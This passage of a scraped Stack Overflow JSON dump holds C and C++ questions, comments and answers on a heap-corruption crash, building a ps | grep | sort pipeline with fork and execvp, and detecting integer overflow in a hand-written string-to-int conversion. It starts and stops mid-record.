=========\n/lib/x86_64-linux-gnu/libc.so.6(+0x77725)[0x7f6ae72ba725]\n/lib/x86_64-linux-gnu/libc.so.6(+0x82bfa)[0x7f6ae72c5bfa]\n/lib/x86_64-linux-gnu/libc.so.6(+0x85179)[0x7f6ae72c8179]\n/lib/x86_64-linux-gnu/libc.so.6(realloc+0x22f)[0x7f6ae72c6e6f]\n./final[0x401d3e]\n./final[0x400b82]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f6ae7263830]\n./final[0x400849]\n======= Memory map: ========\n00400000-00403000 r-xp 00000000 08:01 3146140                            /home/destrovel/cppwork/final\n00602000-00603000 r--p 00002000 08:01 3146140                            /home/destrovel/cppwork/final\n00603000-00604000 rw-p 00003000 08:01 3146140                            /home/destrovel/cppwork/final\n00c10000-00c31000 rw-p 00000000 00:00 0                                  [heap]\n7f6ae0000000-7f6ae0021000 rw-p 00000000 00:00 0 \n7f6ae0021000-7f6ae4000000 ---p 00000000 00:00 0 \n7f6ae702d000-7f6ae7043000 r-xp 00000000 08:01 1069105                    /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f6ae7043000-7f6ae7242000 ---p 00016000 08:01 1069105                    /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f6ae7242000-7f6ae7243000 rw-p 00015000 08:01 1069105                    /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f6ae7243000-7f6ae7403000 r-xp 00000000 08:01 1049974                    /lib/x86_64-linux-gnu/libc-2.23.so\n7f6ae7403000-7f6ae7602000 ---p 001c0000 08:01 1049974                    /lib/x86_64-linux-gnu/libc-2.23.so\n7f6ae7602000-7f6ae7606000 r--p 001bf000 08:01 1049974                    /lib/x86_64-linux-gnu/libc-2.23.so\n7f6ae7606000-7f6ae7608000 rw-p 001c3000 08:01 1049974                    /lib/x86_64-linux-gnu/libc-2.23.so\n7f6ae7608000-7f6ae760c000 rw-p 00000000 00:00 0 \n7f6ae760c000-7f6ae7632000 r-xp 00000000 08:01 1049970                    /lib/x86_64-linux-gnu/ld-2.23.so\n7f6ae77f9000-7f6ae77fc000 rw-p 00000000 00:00 0 \n7f6ae782e000-7f6ae7831000 rw-p 00000000 00:00 0 \n7f6ae7831000-7f6ae7832000 r--p 00025000 08:01 1049970                    /lib/x86_64-linux-gnu/ld-2.23.so\n7f6ae7832000-7f6ae7833000 rw-p 00026000 08:01 1049970                    /lib/x86_64-linux-gnu/ld-2.23.so\n7f6ae7833000-7f6ae7834000 rw-p 00000000 00:00 0 \n7ffd8a23b000-7ffd8a25c000 rw-p 00000000 00:00 0                          [stack]\n7ffd8a331000-7ffd8a333000 r--p 00000000 00:00 0                          [vvar]\n7ffd8a333000-7ffd8a335000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\nAborted (core dumped)\n</code></pre>\n\n<p>I rewrote the function to pass the list back to the calling function, as suggested by 2501, but it didnt change the program aborting at that same spot</p>\n\n<p>Also, gdb gives this when evaluating that line:</p>\n\n<pre><code>realloc: Assertion `ptr == alloc_last_block' failed!\n</code></pre>\n\n<p>EDIT 2 : after a bunch of debugging, its the swap() that corrupts the heap, but i cant figure out why. i rewrote swap() as suggested, but a realloc() immediately after fails while a realloc() immediately before does not</p>\n"}, {"tags": ["c", "bash", "command", "pipe", "ps"], "comments": [{"owner": {"reputation": 2887, "user_id": 5845470, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/606531753afd42de16d82a1199fc4d45?s=128&d=identicon&r=PG&f=1", "display_name": "jdarthenay", "link": "https://stackoverflow.com/users/5845470/jdarthenay"}, "edited": false, "score": 1, "creation_date": 1461783729, "post_id": 36898318, "comment_id": 61361454, "body": "For handling errors, best thing to do is probably to exit (with return in <code>main()</code> or <code>exit()</code>)."}, {"owner": {"reputation": 172529, "user_id": 140750, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/4c7af12cad08c95bc206a9636d164224?s=128&d=identicon&r=PG", "display_name": "William Pursell", "link": "https://stackoverflow.com/users/140750/william-pursell"}, "edited": false, "score": 0, "creation_date": 1461783792, "post_id": 36898318, "comment_id": 61361495, "body": "Don&#39;t put a newline at the end of the string passed to <code>perror</code>.  <code>perror</code> will print your string followed by a <code>:</code>, and it looks odd if that colon starts on a new line."}, {"owner": {"reputation": 37256, "user_id": 736308, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/o5EqQ.jpg?s=128&g=1", "display_name": "cdarke", "link": "https://stackoverflow.com/users/736308/cdarke"}, "edited": false, "score": 1, "creation_date": 1461787615, "post_id": 36898318, "comment_id": 61363895, "body": "The next line after <code>execl</code> will only be executed if <code>execl</code> fails."}, {"owner": {"reputation": 37256, "user_id": 736308, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/o5EqQ.jpg?s=128&g=1", "display_name": "cdarke", "link": "https://stackoverflow.com/users/736308/cdarke"}, "edited": false, "score": 0, "creation_date": 1461787868, "post_id": 36898318, "comment_id": 61364031, "body": "The <code>&quot;&gt;fd_file&quot;</code> in your <code>execl</code> will be passed as a parameter to <code>sort</code>, it will not do redirection - that is done by a shell, and you are not running a shell."}], "answers": [{"tags": [], "owner": {"reputation": 2887, "user_id": 5845470, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/606531753afd42de16d82a1199fc4d45?s=128&d=identicon&r=PG&f=1", "display_name": "jdarthenay", "link": "https://stackoverflow.com/users/5845470/jdarthenay"}, "is_accepted": false, "score": 1, "last_activity_date": 1461793556, "last_edit_date": 1461793556, "creation_date": 1461792229, "answer_id": 36901173, "question_id": 36898318, "link": "https://stackoverflow.com/questions/36898318/how-to-pipe-in-c/36901173#36901173", "title": "How to pipe in C", "body": "<p>While chaining two commands can seem simple, it's a bit more tricky to try to chain more. I give a program that can be easily generalized to chain any number of commands. I prefer to keep first process as a parent of all processes.</p>\n\n<p>Please read comments for more detailed explanations.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;fcntl.h&gt;\n\n\n// Better to use define for constants\n#define SUB_PROCESSES_NUMBER 2\n#define FILE_OUT \"out.txt\"\n#define FILE_LOGS \"log.txt\"\n\nchar *command0[] = {\"ps\", \"-eo\" \"user,pid,ppid\", NULL};\nchar *command1[] = {\"grep\", \"^user\", NULL}; // \"^user\" matches lines starting with \"user\"\nchar *command2[] = {\"sort\", \"-nk2\", NULL};\nchar **commands[SUB_PROCESSES_NUMBER + 1] = {command0, command1, command2};\n\nint main(){\n    pid_t pid[SUB_PROCESSES_NUMBER]; // good practice: fork() result is pid_t, not int\n    int fd[SUB_PROCESSES_NUMBER][2];\n\n    // I recommend opening files now, so if you can't you won't create unecessary processes\n    int fd_file_out = open(FILE_OUT, O_WRONLY | O_CREAT | O_TRUNC, 00600);\n    if (fd_file_out &lt; 0)\n    {\n        perror(\"open(\" FILE_OUT \")\");\n        return 2;\n    }\n\n    int fd_file_logs = open(FILE_LOGS, O_WRONLY | O_CREAT | O_TRUNC, 00600);\n    if (fd_file_logs &lt; 0)\n    {\n        perror(\"open(\" FILE_LOGS \")\");\n        close(fd_file_out); // Not necessary, but I like to do it explicitly\n        return 2;\n    }\n\n    for (int i = 0; i &lt; SUB_PROCESSES_NUMBER; i++) // If you decide to add more steps, this loop will be handy\n    {\n        if (pipe(fd[i]) &lt; 0)\n        {\n            perror(\"pipe\");\n            close(fd_file_out);\n            close(fd_file_logs);\n            if (i &gt; 0)\n            {\n                close(fd[i - 1][0]);\n            }\n            return 2;\n        }\n\n        pid[i] = fork();\n        if (pid[i] &lt; 0)\n        {\n            perror(\"fork()\");\n            close(fd_file_out);\n            close(fd_file_logs);\n            if (i &gt; 0)\n            {\n                close(fd[i - 1][0]);\n            }\n            close(fd[i][0]);\n            close(fd[i][1]);\n            return 2;\n        }\n\n        if (pid[i] == 0)\n        {\n            close(fd[i][0]); // First thing to do: close pipes and files you don't need any more\n            close(fd_file_out);\n\n            close(1);\n            dup(fd[i][1]);\n            close(fd[i][1]); // duplicated pipes are not useful any more\n\n            close(2); // Also need to redirect stderr\n            dup(fd_file_logs);\n            close(fd_file_logs);\n\n            if (i &gt; 0)\n            {\n                close(0); // Also need to redirect stdin if this is not first process\n                dup(fd[i - 1][0]);\n                close(fd[i - 1][0]);\n            }\n\n            execvp(commands[i][0], commands[i]); // In a loop, we need a execv()/execvp()/execvpe() call\n            return 2; // Should not be reached;\n        }\n\n        // sub process either did execvp() or return, he won't reach this point\n        close(fd[i][1]);\n        if (i &gt; 0)\n        {\n            close(fd[i - 1][0]);\n        }\n    }\n\n    close(fd_file_logs);\n\n    close(0);\n    dup(fd[SUB_PROCESSES_NUMBER - 1][0]);\n    close(fd[SUB_PROCESSES_NUMBER - 1][0]);\n\n    close(1);\n    dup(fd_file_out);\n    close(fd_file_out);\n\n    execvp(commands[SUB_PROCESSES_NUMBER][0], commands[SUB_PROCESSES_NUMBER]);\n    perror(\"execvp\");\n    return 2;\n}\n</code></pre>\n"}], "owner": {"reputation": 225, "user_id": 5615653, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/dd7320ed0d639a25da3db1de99a25ff3?s=128&d=identicon&r=PG&f=1", "display_name": "magalenyo", "link": "https://stackoverflow.com/users/5615653/magalenyo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1106, "favorite_count": 0, "closed_date": 1461843975, "answer_count": 1, "score": 3, "last_activity_date": 1461793556, "creation_date": 1461782627, "last_edit_date": 1461783375, "question_id": 36898318, "link": "https://stackoverflow.com/questions/36898318/how-to-pipe-in-c", "closed_reason": "Duplicate", "title": "How to pipe in C", "body": "<p>So, I'd like to do the following command line in C: </p>\n\n<pre><code> ps -eo user,pid,ppid 2&gt; log.txt | grep user 2&gt;&gt;log.txt | sort -nk2 &gt; out.txt\n</code></pre>\n\n<p>But I'm not sure like, at all how could the code be...\nI'm confused at how do I have to write the output of a command into a file, the correct and the error output... </p>\n\n<p>Also, I have no idea of how should I struct the piping and what to do when pid == -1 or when pid > 0...</p>\n\n<p>My code below:</p>\n\n<pre><code>int main(){\n\n    int fd0[2], fd1[2], pid0, pid1;\n\n    pipe(fd0);\n    pid0 = fork();\n    if (pid == 0){\n        close(1);\n        dup(fd0[0]);\n        fd_file= open(\u201c./out.txt\u201d, O_WRONLY | O_CREAT | O_TRUNC, 00600);\n        execl(\"sort\",\"-nk2\",\"&gt;fd_file\");\n        pipe(fd1);\n        pid1 = fork();\n        if (pid1 == 0){ \n            close(1);\n            dup(fd1[0]);\n            ...?\n        }\n\n    }\n    else if (pid == -1){\n        perror(\"ERROR AT SORT!\\n\");\n        exit(1);\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 156, "user_id": 6162709, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/lEQOC.png?s=128&g=1", "display_name": "stackoverfloweth", "link": "https://stackoverflow.com/users/6162709/stackoverfloweth"}, "edited": false, "score": 0, "creation_date": 1461782518, "post_id": 36898163, "comment_id": 61360669, "body": "Can you show me multiple inputs and outputs that you want, and or explain what you want in more detail. There seems to be an easier way to do this."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1461782663, "post_id": 36898163, "comment_id": 61360776, "body": "You can check the value of <code>num</code> <i>before</i> multiplying it by 10. Catch the overflow event before it happens."}, {"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1461782665, "post_id": 36898163, "comment_id": 61360779, "body": "May we assume that using pre-existing functions like <code>std::stoi</code> and <code>strtol</code> that do this are disallowed?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1461784605, "post_id": 36898163, "comment_id": 61361995, "body": "Please don&#39;t dabble with the code posted. This isn&#39;t a real-time edit-feedback site. You need to break the loop on the first condition too."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461786610, "post_id": 36898163, "comment_id": 61363268, "body": "<code>if (num &lt; (INT_MAX&#47;10)) {             num *= 10;         }          if (num &lt; INT_MAX - 10)             num += s[i++] - &#39;0&#39;;</code> does not work.  Try <code>&quot;2147483640&quot;</code> and <code>&quot;2147483647&quot;</code>  Best to revert your post to its original as commented by @Weather Vane"}], "answers": [{"comments": [{"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1461782845, "post_id": 36898341, "comment_id": 61360892, "body": "think you mean ` INT_MAX / 10` here ` INT_MAX - 10`"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1461783119, "post_id": 36898341, "comment_id": 61361073, "body": "@user4581301 the answer has both, but only the <code>num&lt;(INT_MAX&#47;10)</code> is necessary. Adding 9 cannot then overflow <code>INT_MAX</code>."}, {"owner": {"reputation": 135, "user_id": 4904312, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f4aa02472e031ac11f7305b4c53d340f?s=128&d=identicon&r=PG", "display_name": "Calihog", "link": "https://stackoverflow.com/users/4904312/calihog"}, "edited": false, "score": 0, "creation_date": 1461783146, "post_id": 36898341, "comment_id": 61361095, "body": "I&#39;ve tried <code>if (num&lt; (INT_MAX&#47;10))             num *= 10;         if (num &lt; INT_MAX - 10 )             num += s[i++] - &#39;0&#39;;</code> but it doesn&#39;t work."}, {"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461783268, "post_id": 36898341, "comment_id": 61361165, "body": "Thanks @WeatherVane . Couldn&#39;t grasp what that last test was for."}, {"owner": {"reputation": 135, "user_id": 4904312, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f4aa02472e031ac11f7305b4c53d340f?s=128&d=identicon&r=PG", "display_name": "Calihog", "link": "https://stackoverflow.com/users/4904312/calihog"}, "edited": false, "score": 0, "creation_date": 1461783802, "post_id": 36898341, "comment_id": 61361503, "body": "Any idea what I am doing wrong if this is the correct answer? I&#39;m doing the check <code>num&lt;(INT_MAX&#47;10)</code> and then <code>num *= 10</code>"}, {"owner": {"reputation": 1051, "user_id": 4134321, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iTKqJ.jpg?s=128&g=1", "display_name": "Henrik Carlqvist", "link": "https://stackoverflow.com/users/4134321/henrik-carlqvist"}, "edited": false, "score": 0, "creation_date": 1461784242, "post_id": 36898341, "comment_id": 61361752, "body": "As INT_MAX is 2147483647 adding 9 to 2147483640 could overflow INT_MAX. Also, adding 9 to 2147483638 would not overflow INT_MAX but might later underflow INT_MIN if you find a &quot;-&quot; to try and convert -2147483647. I don&#39;t know why you fail with your checks, but maybe you would want to add some else that flags that you have avoided an overflow so it will be detected? What result do you get when you think things go wrong?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 135, "user_id": 4904312, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f4aa02472e031ac11f7305b4c53d340f?s=128&d=identicon&r=PG", "display_name": "Calihog", "link": "https://stackoverflow.com/users/4904312/calihog"}, "edited": false, "score": 0, "creation_date": 1461784317, "post_id": 36898341, "comment_id": 61361806, "body": "@Calihog you have not shown what you do if you can&#39;t take any more digits, so we don&#39;t know. But I suggest <code>if (num &gt; INT_MAX&#47;10) break;</code>"}, {"owner": {"reputation": 135, "user_id": 4904312, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f4aa02472e031ac11f7305b4c53d340f?s=128&d=identicon&r=PG", "display_name": "Calihog", "link": "https://stackoverflow.com/users/4904312/calihog"}, "edited": false, "score": 0, "creation_date": 1461784596, "post_id": 36898341, "comment_id": 61361982, "body": "I have updated my code in the question. With the following string I get a result of &quot;214748371&quot; in the variable num."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461784823, "post_id": 36898341, "comment_id": 61362140, "body": "@HenrikCarlqvist yes you got me, I was working from <code>999999999</code>"}, {"owner": {"reputation": 1051, "user_id": 4134321, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iTKqJ.jpg?s=128&g=1", "display_name": "Henrik Carlqvist", "link": "https://stackoverflow.com/users/4134321/henrik-carlqvist"}, "edited": false, "score": 0, "creation_date": 1461785356, "post_id": 36898341, "comment_id": 61362494, "body": "214748371 is more than INT_MAX/10. So we get rather close but not all the way up to INT_MAX... If you want to be able to get all the way up to INT_MAX you will need a third solution: 1) store the previous value of num. 2) Increase num. 3) Check that num is bigger than the previous value of num."}, {"owner": {"reputation": 135, "user_id": 4904312, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f4aa02472e031ac11f7305b4c53d340f?s=128&d=identicon&r=PG", "display_name": "Calihog", "link": "https://stackoverflow.com/users/4904312/calihog"}, "edited": false, "score": 0, "creation_date": 1461786030, "post_id": 36898341, "comment_id": 61362906, "body": "&#205; don&#39;t think I&#39;m doing the right thing. I thought that I should get 214748364 as the last value. Can I see your implementation? :("}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1461786543, "post_id": 36898341, "comment_id": 61363223, "body": "@HenrikCarlqvist <i>1) store the previous value of num. 2) Increase num. 3) Check that num is bigger than the previous value of num.</i>  But integer overflow is undefined behavior.  That&#39;s THE example given in the <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">C Standard</a> for the definition of &quot;undefined behavior&quot;:  &quot;EXAMPLE An example of undefined behavior is the behavior on integer overflow.&quot;"}, {"owner": {"reputation": 1051, "user_id": 4134321, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iTKqJ.jpg?s=128&g=1", "display_name": "Henrik Carlqvist", "link": "https://stackoverflow.com/users/4134321/henrik-carlqvist"}, "edited": false, "score": 0, "creation_date": 1461787393, "post_id": 36898341, "comment_id": 61363753, "body": "The reason that you get 214748371 instead of 214748364 when you was hoping for 2147483647 is that you first get 214748364 but that is not multiplied by 10 to avoid possible overflow. But then you add 7 to 214748364 which sums up to 214748371. IMHO the best thing would be to somehow detect and report overflow."}, {"owner": {"reputation": 1051, "user_id": 4134321, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iTKqJ.jpg?s=128&g=1", "display_name": "Henrik Carlqvist", "link": "https://stackoverflow.com/users/4134321/henrik-carlqvist"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1461787498, "post_id": 36898341, "comment_id": 61363818, "body": "@Andrew Henle you are right that integer overflow is not defined so my example in the comment might not work. In most cases it will however when integers are represented by 2 complement numbers."}, {"owner": {"reputation": 1051, "user_id": 4134321, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iTKqJ.jpg?s=128&g=1", "display_name": "Henrik Carlqvist", "link": "https://stackoverflow.com/users/4134321/henrik-carlqvist"}, "edited": false, "score": 0, "creation_date": 1461821771, "post_id": 36898341, "comment_id": 61375532, "body": "But if you really want 214748364 above it could be rather easy done with: <code>if (num &lt; (INT_MAX&#47;10)) {num *= 10; if (num &lt; INT_MAX - 10) {num += s[i++] - &#39;0&#39;;} else break; } else break;</code>. It would also be possible to get a little close with 2147483640 with <code>if (num &lt;= (INT_MAX&#47;10)) {num *= 10; if (num &lt; INT_MAX - 10) {num += s[i++] - &#39;0&#39;;} else break; } else break;</code>."}], "tags": [], "owner": {"reputation": 1051, "user_id": 4134321, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iTKqJ.jpg?s=128&g=1", "display_name": "Henrik Carlqvist", "link": "https://stackoverflow.com/users/4134321/henrik-carlqvist"}, "is_accepted": false, "score": 1, "last_activity_date": 1461782705, "creation_date": 1461782705, "answer_id": 36898341, "question_id": 36898163, "link": "https://stackoverflow.com/questions/36898163/manually-converting-string-to-int-and-check-if-an-overflow-occured-in-c-c/36898341#36898341", "title": "Manually converting string to int and check if an overflow occured in C/C++?", "body": "<p>I see two possible solutions:</p>\n\n<p>1) Check if num&lt;(INT_MAX/10) before multiplying num with 10 and check that num &lt; INT_MAX - 10 before adding s[i++]. You will need to include limits.h for this.</p>\n\n<p>2) After converting your string to an int, use <code>snprintf</code> to print your int back to a string and use <code>strcmp</code> to see if your strings are identical.</p>\n"}, {"comments": [{"owner": {"reputation": 135, "user_id": 4904312, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f4aa02472e031ac11f7305b4c53d340f?s=128&d=identicon&r=PG", "display_name": "Calihog", "link": "https://stackoverflow.com/users/4904312/calihog"}, "edited": false, "score": 0, "creation_date": 1461783099, "post_id": 36898389, "comment_id": 61361061, "body": "There is &quot;Manually&quot; at the topic for a reason. I don&#39;t want to use functions for this solution. Thanks anyway."}, {"owner": {"reputation": 34957, "user_id": 2642059, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Jonathan Mee", "link": "https://stackoverflow.com/users/2642059/jonathan-mee"}, "reply_to_user": {"reputation": 135, "user_id": 4904312, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f4aa02472e031ac11f7305b4c53d340f?s=128&d=identicon&r=PG", "display_name": "Calihog", "link": "https://stackoverflow.com/users/4904312/calihog"}, "edited": false, "score": 1, "creation_date": 1461788057, "post_id": 36898389, "comment_id": 61364155, "body": "@Calihog I&#39;m not sure why you&#39;d say that? Why would you try to reinvent what the standard already provides? Unless... Is this homework?"}], "tags": [], "owner": {"reputation": 34957, "user_id": 2642059, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Jonathan Mee", "link": "https://stackoverflow.com/users/2642059/jonathan-mee"}, "is_accepted": false, "score": 1, "last_activity_date": 1461788307, "last_edit_date": 1461788307, "creation_date": 1461782865, "answer_id": 36898389, "question_id": 36898163, "link": "https://stackoverflow.com/questions/36898163/manually-converting-string-to-int-and-check-if-an-overflow-occured-in-c-c/36898389#36898389", "title": "Manually converting string to int and check if an overflow occured in C/C++?", "body": "<p>Your best bet is using <a href=\"http://en.cppreference.com/w/cpp/string/basic_string/stol\" rel=\"nofollow\"><code>stoi</code></a> instead of hand-crafting an inferior solution.</p>\n\n<pre><code>try {\n    i = stoi(s);\n} catch(const out_of_range&amp; /*e*/) {\n    i = numeric_limits&lt;int&gt;::max();\n}\n</code></pre>\n\n<p><a href=\"http://ideone.com/vsIsdC\" rel=\"nofollow\"><kbd>Live Example</kbd></a></p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 1, "last_activity_date": 1461785965, "last_edit_date": 1492087233, "creation_date": 1461784631, "answer_id": 36898973, "question_id": 36898163, "link": "https://stackoverflow.com/questions/36898163/manually-converting-string-to-int-and-check-if-an-overflow-occured-in-c-c/36898973#36898973", "title": "Manually converting string to int and check if an overflow occured in C/C++?", "body": "<p>To cope with <code>int</code> overflow, code must <em>prevent</em> it.<br>\nSimple test if <code>num</code> and <code>digit</code> are too big before attempting <code>num*10 + digit</code></p>\n\n<pre><code>(num &gt;= INT_MAX/10) &amp;&amp; ((num &gt; INT_MAX/10) || (digit &gt; INT_MAX%10))\n</code></pre>\n\n<p>Usage</p>\n\n<pre><code>overflow = false;\nwhile (i &lt; s.length()) {\n  int digit = s[i++] - '0';\n\n  // Will num*10 + digit overflow?\n  if ((num &gt;= INT_MAX/10) &amp;&amp; ((num &gt; INT_MAX/10) || (digit &gt; INT_MAX%10))) {\n    // or break per OP's coding goal\n    num = INT_MAX;\n    overflow = true;\n  } else {\n    num *= 10;\n    num += digit;\n  }\n}\n</code></pre>\n\n<p>OP's code also has trouble with the textual version of <code>INT_MIN</code>.</p>\n\n<p><a href=\"https://codereview.stackexchange.com/a/45912/29485\">Sample <code>my_atoi()</code></a> that correctly returns <code>[INT_MIN  ... INT_MAX]</code></p>\n"}], "owner": {"reputation": 135, "user_id": 4904312, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f4aa02472e031ac11f7305b4c53d340f?s=128&d=identicon&r=PG", "display_name": "Calihog", "link": "https://stackoverflow.com/users/4904312/calihog"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 110, "favorite_count": 0, "accepted_answer_id": 36898973, "answer_count": 3, "score": 0, "last_activity_date": 1461788307, "creation_date": 1461782089, "last_edit_date": 1461784531, "question_id": 36898163, "link": "https://stackoverflow.com/questions/36898163/manually-converting-string-to-int-and-check-if-an-overflow-occured-in-c-c", "title": "Manually converting string to int and check if an overflow occured in C/C++?", "body": "<p>I have the following issue - I wrote a function that takes a string and converts it to an int, but I don't know how to check if any overflow occurs. I want to return the last possible value of the integer, before the overflow ocurred. \nFor example: if I have a string representation of \"2147483648\", I want to return 214748364 as an int, because in the next iterration an overflow will occur. Do you have any ideas how to solve this?</p>\n\n<p>My code is:</p>\n\n<pre><code>    int main () {\n    string s = \"2147483647\";\n    int num = 0, i = 0, buff = 0;\n    bool isNegative = false;\n\n    if (s[0] == '-') {\n            isNegative = true;\n            i++;\n        }\n    while (i &lt; s.length()) {\n        if (num &lt; (INT_MAX/10)) {\n            num *= 10;\n        }\n\n        if (num &lt; INT_MAX - 10)\n            num += s[i++] - '0';\n        else\n            break;\n\n    }\n\n    if (isNegative)\n        num = -num;\n\n    cout &lt;&lt; \"\\nthe number is: \" &lt;&lt; num;\n\n    getch();\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "multithreading", "file-io", "curses"], "answers": [{"comments": [{"owner": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461783345, "post_id": 36898334, "comment_id": 61361211, "body": "Yes but I wonder how to catch curses datas output, I don&#39;t know how to do it."}, {"owner": {"reputation": 2048, "user_id": 6192747, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-agy-meieasc/AAAAAAAAAAI/AAAAAAAAAC8/ipYF1p3tygQ/photo.jpg?sz=128", "display_name": "Stian Skjelstad", "link": 